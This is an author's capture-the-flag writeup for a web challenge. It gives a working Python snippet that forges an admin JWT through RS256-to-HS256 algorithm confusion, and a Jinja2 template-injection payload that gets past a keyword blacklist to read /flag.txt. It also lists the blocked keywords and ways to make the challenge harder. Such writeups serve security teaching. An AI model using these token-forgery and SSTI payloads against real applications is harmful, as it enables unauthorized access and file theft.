# SOLVE — Lucky☆Channel (author writeup)

> ⚠️ Full spoilers. This is the intended solution. A working reference exploit
> is in [`solve/solve.py`](solve/solve.py).

**TL;DR:** forge an admin session token via a JWT **RS256→HS256 confusion**
bug, then use the admin-only template preview for **Jinja2 SSTI**, bypassing a
keyword blacklist by reaching `builtins.open` to read `/flag.txt`.

```bash
pip install requests
python3 solve/solve.py http://localhost:1337
```

---

## 0. Recon

- `GET /robots.txt` → disallows `/backstage` and `/lucky-channel/pubkey`.
- The home page brags sessions are "signed tokens now (very secure, RS256!)"
  and links the **public key** at `/lucky-channel/pubkey`.
- Every page carries an HTML comment:
  *"we moved to RS256 … but backstage still has the old **HS** compat path
  turned on from the 2003 build."* — that's the Stage-1 hint.
- Register/login gives you a `lucky_token` cookie (a JWT) with
  `{"role":"user"}`. The Backstage shows a broadcast box **only** to
  `role=admin`.

---

## 1. Stage 1 — JWT algorithm-confusion → admin

Session JWTs are signed **RS256** with a private key. But `/backstage` uses a
hand-rolled "legacy" verifier (`decode_backstage` in `app.py`) that also accepts
**HS256**, and in the HS256 branch it computes the MAC using the **public key**
as the HMAC secret:

```
expected = base64url( HMAC_SHA256( key = <public key PEM bytes>,
                                   msg = "<header_b64>.<payload_b64>" ) )
```

The public key is published at `/lucky-channel/pubkey`, so anyone can mint a
valid token. Build one with `{"alg":"HS256"}` and `{"role":"admin"}`:

```python
import json, hmac, base64, hashlib, requests
b = lambda x: base64.urlsafe_b64encode(x).rstrip(b"=").decode()
pub = requests.get("http://localhost:1337/lucky-channel/pubkey").text
hdr = b(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
pay = b(json.dumps({"user":"h4ck3r","role":"admin"}).encode())
sig = b(hmac.new(pub.encode(), (hdr+"."+pay).encode(), hashlib.sha256).digest())
token = f"{hdr}.{pay}.{sig}"
```

Set it as the `lucky_token` cookie → you are staff and the broadcast box
appears.

> **Why hand-rolled?** The textbook attack passes the PEM straight to
> `jwt.decode(..., algorithms=["RS256","HS256"])`, but modern PyJWT rejects
> PEM-looking HMAC keys (`InvalidKeyError`), so a naïve version would be
> unsolvable. The "intern's legacy HS fallback" framing keeps this classic bug
> authentic and reliably exploitable while still teaching exactly the same
> concept.

---

## 2. Stage 2 — Jinja2 SSTI behind a blacklist → read the flag

The admin broadcast preview renders your text with `render_template_string`
(so staff can use tags like `{{ site_name }}`). That's SSTI, but a content
filter blocks the usual routes (case-insensitive substring match):

```
{%  %}  os  system  popen  subprocess  eval  exec  import
request  config  mro  subclasses  base64  getattr  setattr  self  lipsum  attr(
```

That kills command execution (`os`/`subprocess`/`popen`), the
`config`/`request` leaks, and the `__mro__`/`__subclasses__` gadget hunt — but
**not** the builtins route. Reach `open` through a Jinja global and read the
file directly:

```jinja
{{ cycler.__init__.__globals__.__builtins__.open("/flag.txt").read() }}
```

- `cycler` is a built-in Jinja global → `.__init__.__globals__` gives the
  module globals of `jinja2.utils`, which contains `__builtins__`.
- The dotted form works whether `__builtins__` is a dict or a module, because
  Jinja's attribute lookup falls back to item lookup.
- None of the substrings above appear in the payload, so the WAF passes it.

POST it as `announcement` with your forged admin cookie; the rendered flag
comes back inside `<div class="preview">…</div>`.

---

## Red herrings

- **Guestbook** reflects your name/message but Jinja auto-escapes them — no XSS.
- The seeded `konata:haruhi` account is a normal member; logging in as it does
  **not** grant admin. You must forge the token.
- `os.popen(...)`-style SSTI payloads are blocked by the filter even once you're
  admin — don't go down the RCE path, just `open()` the file.

---

## Difficulty knobs (for organizers)

- **Harder Stage 2:** also ban `__globals__`/`__builtins__` (force a
  `cycler`→`namespace`→builtins detour), or ban `(` to require filter-based
  calls (`|attr`, `|map`), or ban `open`/`read` to push toward a different sink.
- **Harder Stage 1:** don't publish the public key — make players recover it
  from two RS256-signed tokens (classic `rsa_sign2n` / `jwt_forgery` modulus
  recovery).
- **Add an XSS stage:** introduce a headless "admin bot" that visits guestbook
  entries, and remove the auto-escaping on one field.
